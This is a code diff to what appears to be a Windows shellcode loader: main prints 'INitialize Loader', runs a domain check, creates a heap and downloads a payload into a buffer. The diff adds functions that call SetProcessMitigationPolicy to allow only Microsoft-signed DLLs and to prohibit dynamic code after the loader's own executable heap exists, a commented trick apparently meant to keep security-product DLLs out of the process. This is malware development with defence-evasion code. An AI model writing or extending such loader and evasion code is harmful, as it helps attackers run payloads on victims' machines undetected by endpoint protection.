@@ -35,8 +35,45 @@ typedef BOOL(WINAPI* _Chandle)(
     HANDLE hObject
 );
 
+typedef BOOL(WINAPI* _SetProcessMitigationPolicy)(
+     PROCESS_MITIGATION_POLICY MitigationPolicy,
+    PVOID lpBuffer,
+    SIZE_T dwLength
+);
 
 
+
+DWORD dllpolicy() {
+
+
+    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
+    sp.MicrosoftSignedOnly = 1;
+    
+    HMODULE Hmod = GetModuleHandleA("Kernel32.dll");
+    _SetProcessMitigationPolicy SetPolicy = (_SetProcessMitigationPolicy)GetProcAddress(Hmod, "SetProcessMitigationPolicy");
+
+    PROCESS_MITIGATION_POLICY  policy = ProcessSignaturePolicy;
+
+    SetPolicy(policy, &sp, sizeof(sp));
+
+    return 0;
+}
+
+
+DWORD codepolicy() {
+
+    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY  sp = {};
+    sp.ProhibitDynamicCode = 1;
+   
+    HMODULE Hmod = GetModuleHandleA("Kernel32.dll");
+    _SetProcessMitigationPolicy SetPolicy = (_SetProcessMitigationPolicy)GetProcAddress(Hmod, "SetProcessMitigationPolicy");
+
+    PROCESS_MITIGATION_POLICY  policy = ProcessDynamicCodePolicy;
+
+    SetPolicy(policy, &sp, sizeof(sp));
+
+    return 0;
+}
 
 int main()
 {
@@ -45,6 +82,11 @@ int main()
     DomainCheck();
 
     printf("INitialize Loader\n");
+
+    dllpolicy();
+  
+
+
 
     HMODULE rpcdll = GetModuleHandleA("Rpcrt4.dll");
     
@@ -61,6 +103,10 @@ int main()
     void* ha = HeapAC(hc, 0, 0x100000);
     DWORD_PTR hptr = (DWORD_PTR)ha;
 
+    // update policy to avoid RWX after our heap creates lol
+    codepolicy();
+
+    
 
     char* buf = download();    
 
